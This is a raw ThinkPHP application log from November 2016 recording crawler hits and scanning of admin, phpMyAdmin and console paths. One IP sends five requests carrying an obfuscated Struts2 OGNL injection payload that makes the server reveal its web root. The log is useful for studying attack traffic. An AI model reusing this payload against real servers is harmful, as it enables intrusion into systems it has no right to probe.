[ 2016-11-26T00:29:24+08:00 ] 157.55.39.72 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000279s ]
ERR: 无法加载模块:Robots

[ 2016-11-26T00:29:40+08:00 ] 157.55.39.125 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000280s ]
ERR: 无法加载模块:Robots

[ 2016-11-26T01:45:45+08:00 ] 80.82.78.38 http://www.baidu.com/cache/global/img/gs.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000329s ]
ERR: 无法加载模块:Cache

[ 2016-11-26T01:51:16+08:00 ] 222.186.21.195 /index.action?redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000271s ]
ERR: 无法加载模块:Index

[ 2016-11-26T01:51:18+08:00 ] 222.186.21.195 /login.action?redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000272s ]
ERR: 无法加载模块:Login

[ 2016-11-26T01:51:20+08:00 ] 222.186.21.195 /loginAction.action?redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000301s ]
ERR: 无法加载模块:LoginAction

[ 2016-11-26T01:51:31+08:00 ] 222.186.21.195 /admin/loginAction.action?redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000264s ]
ERR: 无法加载模块:Admin

[ 2016-11-26T01:51:31+08:00 ] 222.186.21.195 /login/Jeecms.do?redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000289s ]
ERR: 无法加载模块:Login

[ 2016-11-26T08:03:29+08:00 ] 54.174.135.65 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000345s ]
ERR: 无法加载模块:Robots

[ 2016-11-26T08:03:34+08:00 ] 54.174.135.65 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000283s ]
ERR: 无法加载模块:Robots

[ 2016-11-26T09:09:15+08:00 ] 172.82.166.210 http://www.baidu.com/cache/global/img/gs.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000263s ]
ERR: 无法加载模块:Cache

[ 2016-11-26T09:29:21+08:00 ] 123.125.67.162 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000283s ]
ERR: 无法加载模块:Robots

[ 2016-11-26T10:46:48+08:00 ] 45.32.69.146 /forum.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000319s ]
ERR: 无法加载模块:Forum

[ 2016-11-26T13:12:48+08:00 ] 110.184.80.80 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000297s ]
ERR: 无法加载模块:Favicon

[ 2016-11-26T13:16:03+08:00 ] 110.184.80.80 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000031s ]
INFO: [ app_init ] --END-- [ RunTime:0.000334s ]
ERR: 无法加载模块:Favicon

[ 2016-11-26T13:16:03+08:00 ] 110.184.80.80 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000341s ]
ERR: 无法加载模块:Favicon

[ 2016-11-26T14:11:20+08:00 ] 123.56.233.103 /admin
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000288s ]
ERR: 无法加载模块:Admin

[ 2016-11-26T16:02:03+08:00 ] 222.186.130.194 /phpmyadmin
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
INFO: [ app_init ] --END-- [ RunTime:0.000368s ]
ERR: 无法加载模块:Phpmyadmin

[ 2016-11-26T16:49:38+08:00 ] 117.136.63.148 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000290s ]
ERR: 无法加载模块:Favicon

[ 2016-11-26T16:49:38+08:00 ] 117.136.63.148 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000263s ]
ERR: 无法加载模块:Favicon

[ 2016-11-26T16:49:38+08:00 ] 117.136.63.148 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000031s ]
INFO: [ app_init ] --END-- [ RunTime:0.000317s ]
ERR: 无法加载模块:Favicon

[ 2016-11-26T16:49:38+08:00 ] 117.136.63.148 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000314s ]
ERR: 无法加载模块:Favicon

[ 2016-11-26T18:27:45+08:00 ] 36.5.199.232 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000380s ]
ERR: 无法加载模块:Favicon

[ 2016-11-26T18:27:45+08:00 ] 36.5.199.232 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000258s ]
ERR: 无法加载模块:Favicon

[ 2016-11-26T20:54:12+08:00 ] 222.186.130.194 /phpmyadmin
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000268s ]
ERR: 无法加载模块:Phpmyadmin

[ 2016-11-26T21:58:45+08:00 ] 1.27.48.48 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
INFO: [ app_init ] --END-- [ RunTime:0.000448s ]
ERR: 无法加载模块:Favicon

[ 2016-11-26T21:59:15+08:00 ] 1.27.48.48 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000283s ]
ERR: 无法加载模块:Favicon

[ 2016-11-26T21:59:15+08:00 ] 1.27.48.48 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000321s ]
ERR: 无法加载模块:Favicon

[ 2016-11-26T21:59:54+08:00 ] 1.27.48.48 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000032s ]
INFO: [ app_init ] --END-- [ RunTime:0.000306s ]
ERR: 无法加载模块:Favicon

[ 2016-11-26T21:59:54+08:00 ] 1.27.48.48 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000302s ]
ERR: 无法加载模块:Favicon

[ 2016-11-26T22:07:24+08:00 ] 222.186.34.211 //console/j_security_check
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000340s ]
ERR: 无法加载模块:Console

[ 2016-11-26T22:17:47+08:00 ] 1.27.48.48 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000329s ]
ERR: 无法加载模块:Favicon

[ 2016-11-26T22:17:48+08:00 ] 1.27.48.48 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000315s ]
ERR: 无法加载模块:Favicon

[ 2016-11-26T22:57:15+08:00 ] 138.19.154.62 /phpmyadmin/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000270s ]
ERR: 无法加载模块:Phpmyadmin

